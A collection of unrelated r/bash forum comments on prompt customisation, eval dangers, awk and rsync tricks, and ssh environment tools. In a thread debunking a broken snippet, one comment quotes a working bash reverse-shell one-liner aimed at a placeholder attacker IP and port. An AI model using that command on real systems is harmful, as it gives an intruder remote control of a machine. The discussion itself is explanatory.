websites on dem bloated browsers, alongside a heavyweight application or two. Then, once you hit swap in earnest, recovery is...not simple.
Sorry, I've never had that happen to me. If you can confirm that two independent sites are referencing the exact same video ID, and `youtube-dl` thinks they're different videos, then that's worthy of a bug report (assuming you're running the latest-and-greatest).
ah that fantastic thank you 
$
http://tldp.org/HOWTO/Bash-Prompt-HOWTO/ Look at chapter 12 12.1. links [to this](http://www.gilesorr.com/bashprompt/) where you can find [Also look at this](https://unix.stackexchange.com/questions/124407/what-color-codes-can-i-use-in-my-ps1-prompt) Also read the rest as there will be enough to come up with. e.g. I am just started to write a .bashprompt file where I will put everything and distribute that to the several machines I have for all users. (putting it in /etc/skel) and call it from .bashrc I intend to have different prompts, depending if I am root, user or connected over ssh. (Chapter 12.6)
[SBP](https://github.com/brujoand/sbp) Has been my pet project for a while now. Works pretty well to tout my own horn. Or however that saying goes. :p
I think it's a decent start towards your goal, so I'll keep my nitpicks to a minimum. However: **SECURITY HOLE / HEISENBUG** eval "unset $pName" [...] eval "$pName=\"$value\"" No. Just...no. `eval` is not to be trifled with. The potential for a security compromise is somewhat limited by your parameter definitions, but it's not zero. And even without `eval`, the two lines above still commit a *double homicide*: * the `unset` removes the closest `$pName` variable in the call stack * the assignment then stomps on the second-closest (now closest) `$pName` variable in the call stack. This will likely lead to all sorts of hard-to-debug unexpected variable overwrites, especially if your users are conscientious enough to `local` all their parameters...only for your code to destroy them all and overwrite others with the same name in a wider (possibly *global*) scope. To see what that looks like, guess what this script prints, then run it. *SURPRISE!!!* #!/bin/bash a=1 myfunc() { local a=2 echo "Before(myfunc): a=$a (locals: $(local))" myfunc_2 echo "After(myfunc): a=$a (locals: $(local))" } myfunc_2() { local a=3 echo "Before(myfunc_2): a=$a (locals: $(local))" verifyParameters echo "After(myfunc_2): a=$a (locals: $(local))" } verifyParameters() { unset a a=4 } echo "Before(main): a=$a" myfunc echo "After(main): a=$a" A safer method assumes at least bash 4.x (i.e. not that out-of-date macOS crap). Simply have your user functions declare a `params` associative array: function example { # === state what your parameters are === declare -a paramNames=( "env:enum:required:prod|cert|qual|devl" "queue:string:optional" "query:string:optional" "rank:number:required") # === which will go in here === declare -A params # === Verify and set parameters === verifyParameters "$@" || return 1 # === Do your stuff here === echo "${params[env]} ${params[queue]} ${params[query]} ${params[rank]}" echo "Something" } then `verifyParameter()` can safely set that with impunity: unset params["$pName"] [...] params["$pName"]="$value" **NITPICKS** * Using `--long-option` parameter tags is rather verbose, and more appropriate for script parameters. Consider something like `key=val`, for a little more brevity and consistency, e.g.: * Whichever style you choose, the usage output should look the same to minimize confusion. Your current usage output suggests `key:val`, so a more appropriate output for your existing naming scheme would be: &amp;#8203; * --env enum { prod cert qual devl } --queue string --query string * --rank number * Using `?` to invoke help risks single-character wildcard expansion (and failure to help); use `-h` or `--help` instead.
Couldn't you just limit it with something like `sleep 60; exit 1 &amp;` at the start of the script, `ulimit -f` in a subshell, or use `curl` (isn't it more appropriate for this situation, anyway?) instead with `--max-filesize`? I see your points, though; thanks for taking the time to write this comment!
Features: failed command notification Current ping time to [8.8.8.8](https://8.8.8.8) tty number / tmux / screen annotation full path git integration showing if directory is clean, and branch name
``` ┌(u0_a90@local)─(~/.gxt)─(20:29:58) (master +) └&gt; ``` 
 #^jk
``` parse_git_branch(){ git branch 2&gt; /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/(\1) /'; } hostname_if_ssh(){ if [ -n "$SSH_CLIENT" ] || [ -n "$SSH_TTY" ]; then echo "[$(hostname)] " fi } export PS1='$(hostname_if_ssh)\w $(parse_git_branch)🐖 ' ``` This gives me the hostname in the terminal if I'm SSH'd into something. `\w` gives me the current directory. The next part gives me my current git branch if I'm in a git repo. Last bit - a pig instead of `$` for fun 
https://imgur.com/a/ZLqnndD corresponding POWERLEVEL9K config at https://github.com/Kraymer/F-dotfiles/blob/master/zsh/.oh_my.zsh 
^(Hi, I'm a bot for linking direct images of albums with only 1 image) **https://i.imgur.com/fduQPSi.png** ^^[Source](https://github.com/AUTplayed/imguralbumbot) ^^| ^^[Why?](https://github.com/AUTplayed/imguralbumbot/blob/master/README.md) ^^| ^^[Creator](https://np.reddit.com/user/AUTplayed/) ^^| ^^[ignoreme](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=ignoreme&amp;message=ignoreme) ^^| ^^[deletthis](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=delet%20this&amp;message=delet%20this%20ebubzhh) 
 bash-$ Everything else (cwd, branch info, etc.) goes in my terminal window title.
$(pwd)&gt; http://fars.ee/ShMo 
\[0\]$&gt; adfafd \-bash: adfafd: command not found \[127\]$&gt; PS1="\["\$?"]$&gt; "
I doubt that you will find one since the security issues abound when you give anyone shell access -- which is what you're doing when you test a shell script for someone. Also, writing shell scripts really is dependent upon the environment they're running in. I think the closest thing to a leetcode for shell scripting is going to be a site where you can practice CTFs at the system level. 
http://overthewire.org/wargames/bandit/ This is not exactly shell scripting but doing stuff from the command line with focus on the security stuff.
&gt; I doubt that you will find one since the security issues abound when you give anyone shell access -- which is what you're doing when you test a shell script for someone. Also, writing shell scripts really is dependent upon the environment they're running in. What I was thinking was more of a collection of projects I could work on on my own system that would develop relevant skills, eg "how would you create a recurring report of open ports" &gt; I think the closest thing to a leetcode for shell scripting is going to be a site where you can practice CTFs at the system level. Cut-through switching?
Yeah, about the closest I've been able to come up with has been OTW, and Linux distros like LFS and Damn Vulnerable Linux. 
Not quite. &gt;Capture the Flag (**CTF**) is a special kind of information security competitions. There are three common types of CTFs: Jeopardy, Attack-Defence and mixed. Jeopardy-style CTFs has a couple of questions (tasks) in range of categories. For example, Web, Forensic, Crypto, Binary or something else. You might focus on CTF exercise sites that have an emphasis on forensics. This is mostly a situation where you're on a system and you have to dig for dirt on some activity. &gt;A collection of projects I could work on on my own system that would develop relevant skills I would recommend that you deploy a site or an app on a virtual machine or docker image on your localhost. Then what you can do is run performance tests on that deployed site in order to stress test it. The actual site doesn't really matter. Then you can try to answer questions like: * Where is it slowing down? * How much throughput am I getting? * How many errors are being raised by the running app? * How slow are requests getting as I ratchet up the performance tests? As you answer these questions, make your answers in the form of tooling that computes the answer in a repeatable fashion. In either case, the thing with shell scripting is that its a means to an end. I should add that unless you're doing something really simple with existing unix/linux tooling, you shouldn't be using shell scripting. Instead, you should be using a better scripting language: Python, Ruby, PHP, etc.
I recently saw an amazing prompt, it was Powerline on fish. I am trying fish shell at work right now, it’s very user friendly, but some things are counterintuitive. 
Assuming you know for sure that filenames are unique across all your directories, or if you're OK with stomping over files with the same names, there's a fixed formula for all such "reorganize directory hierarchies" questions: 1. Use bash's `=~` operator (or `sed`, or some other utility) to rip apart each original directory path 2. Assemble a new path according to your needs 3. Use `rsync` to do the copying, as it's smart enough to merge *subdirectories* with the same name, whereas `cp` would either quit in despair or create unnecessary subdirectories. Essentially, you want: src_root=/path/to/src dest_root=/path/to/dest cd "${src_root}" for d in */images/*; do if [[ -d "$d" &amp;&amp; "$d" =~ ([^/]*)/images/(.*) ]]; then dest_dir="${dest_root}/${BASH_REMATCH[2]}/${BASH_REMATCH[1]}" mkdir -p "$dest_dir" &amp;&amp; rsync -av "$d"/ "$dest_dir"/ fi done
 PS1='C:$(pwd | sed "s|^/home|/Users|; s|/|\\\\\\|g;")&gt; '
There's a command named `paste` to do this. Check out its man-page with `man paste`. You will need to use a `-d ' '` parameter to customize the separator character that it will use by default.
[Here's mine](https://github.com/bewuethr/dotfiles/blob/master/myprompt.bash), fully homegrown. Looks like [this](https://i.imgur.com/r6H194W.png). A few features: * Git aware: current branch, count for untracked files, unstaged changes, staged changes, and commits behind/ahead * User and host name abbreviated, as in `user-name@host.name` becoming `u-n@h.n` (supports `-`, `_`, `.`) * Path is shown with directories shortened to their first three characters each, except the current directory * `$` prompt is green if last command had exit status 0 and red otherwise I use solarized dark, not sure how it'll look with other colour schemes. 
 henry|TV|00:00:20 ~ [ 481 ]$ echo $PS1 \[\e[93m\]\u|\h|\t \W\n[ \! ]$ \[\e[0m\]
You might be interested in [this thread](https://old.reddit.com/r/bash/comments/a5bhsj/short_script_to_shorten_path/ebr5u0f/?context=3) from a couple days ago. Abbreviated Working Directory. 
``` is disabled. Try starting each line with 4 spaces
 [Vorthas@T-elos Downloads]&gt; pwd /cygdrive/s/Downloads [Vorthas@T-elos Downloads]&gt; echo $PS1 [\u@\h \W]&gt; [Vorthas@T-elos Downloads]&gt; What I'm using on cygwin, which I typically use elsewhere as well (Linux VMs, etc.). 
/ $ 
\# Exit:0 2018-12-15 23:04:04 \[user@host:\~/src\] $(: !3413 ) &amp;#x200B; Features: * ANSI color bar makes it easy to pick out from a wall of output * Shows exit code and time of completion of last command * Shows history number of the command, so you can repeat it with !3413 * Both are already in comment format, so you can block highlight the lines to copy/paste to/from documentation without having to trim out the prompts. &amp;#x200B; `PS1=$'\[\033[01;36;44m\]# $( EC=$?; [ $EC -eq 0 ] &amp;&amp; echo -n "\[\033[01;32;44m\]Exit:$EC" || echo -n "\[\033[00;31;44m\]Exit:$EC" ) \` `\[\033[00;37;44m\]$(date +%Y-%m-%d\ %H:%M:%S) \[\033[01;34;49m\] \` `\[\033[01;30;49m\][\[\033[00;35;49m\]\u\[\033[01;30;49m\]@\[\033[01;34;49m\]\h\[\033[01;30;49m\]:\` `\[\033[00;33;49m\]\w\[\033[00;36;49m\]\[\033[01;30;49m\]]\[\033[01;34;49m\]\n\` `\[\033[01;36;49m\]\$(: !\! )\[\033[00;00;00m\] '` &amp;#x200B;
[Depending on the shell.](https://gist.github.com/pthfdr-42/a3855fcf445b68f9dadfb41ea168577a)
Hey, you mentioned AWK! Good enough for me. DISCLAIMER: The most powerful thing about AWK is that it exists in the Unix environment with lots of small tools like paste(1). Don't let ridiculous stuff like this turn you off learning awk; it's great. awkpaste(){ gawk ' { f[FNR][FILENAME]=$0 #1 } END{ for(r in f){ #2 for(n=1;n&lt;ARGC;++n){ #3 printf("%s ",f[r][ARGV[n]]) #4 } printf "\n" } }' "$@" #5 } 1) Every entire line `$0` goes in array `f`, indexed by Field Number Record (line number per file) and Filename. 2) Loop through each record. (r=FNR) 3) Loop through each argument (filename). `ARGC` is the number (count) of arguments. 4) Bear with me. In the most recent loop, `ARGV[n] henry|TV|02:02:41 ~ [ 570 ]$ cat alpha bravo charlie alphaOne alphaTwo alphaThree bravoOne bravoTwo bravoThree charlieOne charlieTwo charlieThree henry|TV|02:03:34 ~ [ 571 ]$ awkpaste charlie alpha bravo charlieOne alphaOne bravoOne charlieTwo alphaTwo bravoTwo charlieThree alphaThree bravoThree
[Demo](https://cdn.rawgit.com/rawiriblundell/dotfiles/master/termtosvg_e_udnoec.svg) [Code](https://gist.githubusercontent.com/rawiriblundell/2c4631611052509a55c658cd0efaab35/raw/b2b0d80fe62a0cc92c7fd324a59d129b09b4aede/setprompt)
Loved this when I found it, and definitely helped my bash skills!
You should use the machine-readable [data files](https://unicode.org/Public/emoji/11.0/).
Yeah i did check those files. But there is not a file with all of the emojis. Some have two emojis together and some have just flags and some other stuff. 
Use XSLT instead of bash. I admit I learned the most about regexes when I tried to parse HTML, so I'd encourage you to try that with bash if that's what you really want, but then again, it's much nicer with XSLT.
I don't quite understand what you're missing. _By definition_, the data files contain all of the information in the Unicode standard. The descriptions aren't technically part of the Unicode standard. They are published separately as "[CLDR](http://cldr.unicode.org/) annotations", and they're available in a variety of locales. For English, you could grab the descriptions for emoji from [this file](https://unicode.org/repos/cldr/tags/latest/common/annotations/en.xml).
If you're using a regex to parse HTML, you're doing it wrong. All it takes is for the list maintainers to use a different generator that puts the `&lt;td&gt;` and `&lt;/td&gt;` tags on separate lines; that will break your code...permanently. Better to use a proper command-line HTML parsing tool like [pup](https://github.com/EricChiang/pup) to do the deed: ``` curl https://unicode.org/emoji/charts/full-emoji-list.html &gt; tmp.html # Get all the emojis... pup -p 'td.chars text{}' &lt; tmp.html # ...and all their descriptions pup -p 'td.name text{}' &lt; tmp.html ```
`envsubst` command can replace environment variables of the form $VARIABLE or ${VARIABLE} with their corresponding values. It reads standard input and writes to standard output. `eval` is generally a dangerous command to use in scripts, it leaves a door open to code injection.
Thanks, that's exactly what I was looking for. Managed to waste half an hour on it too, it errored in a completely unexpected way to the point where I started to question my sanity, but I just ran the script with sh instead of bash and didn't even notice. Apparently, sh doesn't support this kind of redirection &lt;( echo "$a" )
Maybe you can shrink it down a bit ;) : ` echo "Enter first number:" read -r a echo "Enter Second number:" read -r b echo "Enter operation to be carried out that is + , - , / or x " read -r opr ​ if [ "$opr" == "/" ] ; then echo "scale=3; $a / $b" | bc elif [[ "$opr" == "-" || "$opr" == "+" || "$opr" == "*"]] ; then echo $((a $opr b)) fi `
Replaced eval. I sometimes am forced to use Windows GitBash. I don't have envsubst in that environment.
Obligatory [stackoverlfow]() post.
What the heck is that.
_Reverse TCP bash shell_
It's missing the part where it does the TCP.
That's the main problem. 
Read the comments to the blog you posted.. &gt;DarwinThursday, June 04, 2015 I think I am missing something. I am not quite sure how the following would allow for a reverse shell access &gt;exec /bin/bash 0&amp;0 2&gt;&amp;0 &gt;Reply Replies &gt;cameron maerzSaturday, August 01, 2015 it wouldn't, but this does: /bin/bash -i &gt;&amp; /dev/tcp/attackerip/4444 0&gt;&amp;1
thanks! so in this case, is the src_dir where directories 0/images 1/images ... are stored? and the dest is where I want D1_11111/0 1 D1_22222/0 1 to be stored?
Thank you :), i didn't noticed it, is the answer from the website OP? 
&gt; a lot of websites propose the above solution. This intrigued me since I thought it might be some obscure poorly documented feature, so I had a look and all I found was a lot of websites copying the same reverse shell codes from each other and reposting the information without useful context. Looks like some typo that just keeps getting copied from one page to another without anyone fact checking it. Without using `/dev/tcp` or `/dev/udp` you aren't going to get bash to connect anywhere, and I can't think of any wierd aliases where `0`could be aliased to something useful in that context where `exec /bin/bash 0&amp;0 2&gt;&amp;0` would do anything useful. 
Yes. The terminal typically closes when the shell process exits. You can do this with a simple `exit`, or by replacing the shell process with a short lived one through `exec true` or similar.
As a bash novice, how is OPs statement true about exec echo exec kills the terminal
It doesn't kill the terminal as such, it's just a convoluted way of exiting the shell.
Yes.
The name "sshrc" rang a bell, and sure enough, someone's gone and done a superset of what you're trying to accomplish: [Russell91/sshrc](https://github.com/Russell91/sshrc). I don't use it myself, but I like the way `sshrc` dynamically packages an entire custom bash environment into a single Base64-encoded tarball, then ships it over the same connection that you'd use for interaction with the remote system. It therefore accomplishes with one SSH connection what your solution takes _four_ to do; if you have to authenticate each connection, that's a major win all by itself. I recommend `sshrc` to your attention, either as your end solution, or for ideas to improve your existing function. Have fun!
I wrote a very-overengineered tool for this, which I use on a daily basis. It doesn't copy your bashrc verbatim, but rather allowa you to "include" chunks of it. It's worked well for me, for several years. It's part of my bashrc\_enhancements project. https://github.com/zish/bashrc\_enhancements
As I answered elsewhere: "I tried that one, but it had a huge drawback, and that's that tab completion doesn't work with it. I have a lot of servers defined in my .ssh/config file, and tab completion is vital to my workflow. This variation works with tab completion so my workflow changes minimally. One drawback of this, however, is that tab completion won't work when trying to rsync or scp on a remote path, so for example \`rsync host:remote/pat\[tab\]\` will hang, but that's a drawback that doesn't affect me as much and I'm willing to live with that." But I might take a look and see what else they do and improve my function. You also gave me an idea, I could try aliasing sshrc to ssh to try and get bash-completion working. I'll have to try that tomorrow. I'm also not sure if using `sudo -i` in sshrc will use the same environment for root or whatever user you want to login as after the innitial connection.
Don't look too closely at the code LOL. It **does** work. I use it interchangably between Ubuntu, CentOS7, and MacOS (Bash4 from Macports or Homebrew) without issue.
Oh nice! That's helpful, I'll have to check it out tomorrow.
Is Perl5 a clientside dependency or is it neccessary on the server as well?
Building on this comment, OP, you should construct your query in XPath instead of RegEx. For your queries, see the following XPath: //td[@class= 'chars'] //td[@class= 'name'] XSLT can use these XPath queries to construct a template for an output file. Since you're using bash, I'd recommend that you install `xsltproc` and `xmllint`. `xmllint` has an interactive prompt where you can experiment with your XPath queries until they look right. After you've created a transformation template in XSLT to transform your HTML to your desired output, you can execute it with something like this: curl -sL "http://host.com/some/path" | xsltproc -o newfile.txt your-template.xsl - 
You could check what completion `ssh` is set to with `complete -p ssh` (if you use bash-completion, you have to try to use it first so the completion is dynamically loaded) - probably something like complete -F _ssh ssh and then you add your own completion complete -F _ssh sshrc to either `.bashrc` or, if you use bash-completion, `~/.bash_completion`. Now, `sshrc` should behave the same as `ssh` for tab completion.
&gt; tab completion doesn't work with it Just configure tab completion like you would any alias. complete -F _known_hosts sshrc 
Yes, i did two other calculators, using different functions. All for homework.
Don't hardcode absolute paths to executables. Use `command ssh` instead. It will find ssh in PATH, ignoring any function or alias named ssh.
https://github.com/sineemore/backpack Somewhat similar to sshrc, but with a bit different goals.
It's needed on both sides, unfortunately. However, you need to have a host entry in your ~/.ssh/config (wildcards are supported) for my function to even do anything with the remote side. You can also override things, even in there is a host entry, by adding a comment at the end of the line with \#promptonly or \#noprompt (This was originally for passing my aliases and over-engineered PS1 to the remote session). Both of these will skip the Perl dependency on the remote side, **but you won't have anything from your local .bashrc pushed to the remote.** I feel I should also mention that it doesn't overwrite your remote .bashrc.
`uniq` only removes consecutive repeated lines. You could accomplish your task by combining the lines, sorting the file, and then using `sort -u &lt;file&gt;`, but that gets really messy really quickly. &amp;#x200B; awk -v RS= -v ORS='\n\n' '!seen[$0]++' &lt;file&gt; `RS` is the Records Separator, which in this case is telling awk to parse input by lines that are completely empty (warning a line filled with whitespace is *not* considered empty) &gt;[StackOverflow](https://stackoverflow.com/a/7892436) &amp;#x200B; `ORS` is the Output Records Separator, which tells awk how to separate the output. In this case its setting it to be add a blank line between records &gt;[StackOverflow](https://stackoverflow.com/a/2022001) &amp;#x200B; `'!seen[$0]++'` is telling awk which records to print. The variable `$0` holds the contents of a record, `seen` is an arbitrarily named array we are creating, and the square brackets are accessing that array. So, for each record of the file, we are addressing a location in the array using the contents of the record and adding one to that value using `++`. By checking the value stored in the array, we're able to tell if that record has already been printed. &gt;[StackOverflow](https://stackoverflow.com/a/11532197)
Since the input looks like a changelog, I'll assume that the lines beginning with a `*` are sufficient for recognizing duplicate sections. And since you're posting in r/bash, here's a stupid-simple pure-bash solution, no external commands required. One advantage over all other solutions that involve `sort` and/or `uniq`: The original block order is preserved. One possible disadvantage over other solutions: Initial whitespace (indentation) is removed. If that's important, someone can probably convert this logic to its equivalent in `awk` or something. $ cat dedup.sh declare -A keys do_print="" while read l; do case "$l" in \*\ *) # Is this a new key line? if [[ -z "${keys[$l]}" ]]; then keys["$l"]=1 do_print=1 echo "$l" fi ;; "") [ -n "$do_print" ] &amp;&amp; echo "$l" # Blank line denotes end-of-section do_print="" ;; *) [ -n "$do_print" ] &amp;&amp; echo "$l" ;; esac done $ cat CHANGELOG * Wed Feb 24 2016 Tariq Saeed &lt;tariq.x.saeed@mail.com&gt; 2.0.7-1.0.7 - add vmcore dump support for ocfs2 [bug: 22822573] * Mon Jun 8 2015 Brian Maly &lt;brian.maly@mail.com&gt; 2.0.7-1.0.3 - Fix stall on failure in kdump init script [bug: 21111440] - kexec-tools: fix fail to find mem hole failure on i386 [bug: 21111440] * Wed Feb 24 2016 Tariq Saeed &lt;tariq.x.saeed@mail.com&gt; 2.0.7-1.0.7 - add vmcore dump support for ocfs2 [bug: 22822573] * Mon Jun 8 2015 Brian Maly &lt;brian.maly@mail.com&gt; 2.0.7-1.0.3 - Fix stall on failure in kdump init script [bug: 21111440] - kexec-tools: fix fail to find mem hole failure on i386 [bug: 21111440] $ bash dedup.sh &lt; CHANGELOG * Wed Feb 24 2016 Tariq Saeed &lt;tariq.x.saeed@mail.com&gt; 2.0.7-1.0.7 - add vmcore dump support for ocfs2 [bug: 22822573] * Mon Jun 8 2015 Brian Maly &lt;brian.maly@mail.com&gt; 2.0.7-1.0.3 - Fix stall on failure in kdump init script [bug: 21111440] - kexec-tools: fix fail to find mem hole failure on i386 [bug: 21111440] 
Huh, I'll have to try that. Thanks!
I'll have to try that, thanks.
Thanks for the tip! The hardcoded ssh was neccessary so that it doesn't call itself again, but I'll see if it will work with command.
Hey, dafta007, just a quick heads-up: **neccessary** is actually spelled **necessary**. You can remember it by **one c, two s’s**. Have a nice day! ^^^^The ^^^^parent ^^^^commenter ^^^^can ^^^^reply ^^^^with ^^^^'delete' ^^^^to ^^^^delete ^^^^this ^^^^comment.
I'll have to check it out!
Good bot
Your script won't even run, because it's full of syntax errors (`number_of_occurrences -eq || number_of_occurrences -gt 2`) and mixed-up args (`grep -c /data/sia/seda/request/sent/"$xml_file" "&lt;Sts&gt;ACTC&lt;/Sts&gt;"`). But even after you fixed all of them, your script will not process anything because it's _targeting_ an XML file whose filename contains the date and time when you run the script _to the millisecond_. The odds of that succeeding are pretty much zero. You're better off _extracting_ the date (and time, if needed) from each _existing_ filename as you process them. Which leads to something like the following: ``` #!/bin/bash # Grep all available files at one go grep -cFH "&lt;Sts&gt;ACTC&lt;/Sts&gt;" /data/sia/seda/request/sent/ALLT8.*.xml | while IFS=: read filename grep_cnt; do if [[ $grep_cnt -ge 2 ]]; then # TODO: success stuff here else # Extract date from filename with regex [[ $filename =~ .*\.D([0-9]{6})\..* ]] &amp;&amp; date="${BASH_REMATCH[1]}" || date="unknown" # TODO: failure stuff here done
Thanks I will reply soon